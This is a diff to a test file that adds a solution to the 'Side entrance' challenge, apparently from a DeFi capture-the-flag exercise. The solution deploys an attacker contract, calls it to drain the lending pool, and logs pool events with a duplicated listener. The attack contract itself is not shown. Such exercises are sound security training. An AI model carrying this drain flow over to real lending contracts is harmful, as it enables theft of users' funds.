@@ -26,6 +26,25 @@ describe('[Challenge] Side entrance', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // event Deposit(address indexed who, uint256 amount);
+        // event Withdraw(address indexed who, uint256 amount);
+        pool.on("Deposit", (from, value, event) => {
+            console.log(`Event emitted by: ${from} with value: ${value.toString()}`);
+        });
+        pool.on("Deposit", (from, value, event) => {
+            console.log(`Event emitted by: ${from} with value: ${value.toString()}`);
+        });
+
+        attacker = await (await ethers.getContractFactory('SideEntranceAttacker', player)).deploy(pool.address);
+
+        attacker.on("Attack", (from, value, event) => {
+            console.log(`Event emitted by: ${from} with value: ${value.toString()}`);
+        });
+
+        await attacker.connect(player).attack();
+        await attacker.getMoney();
+        await attacker.connect(player).giveMoney();
     });
 
     after(async function () {
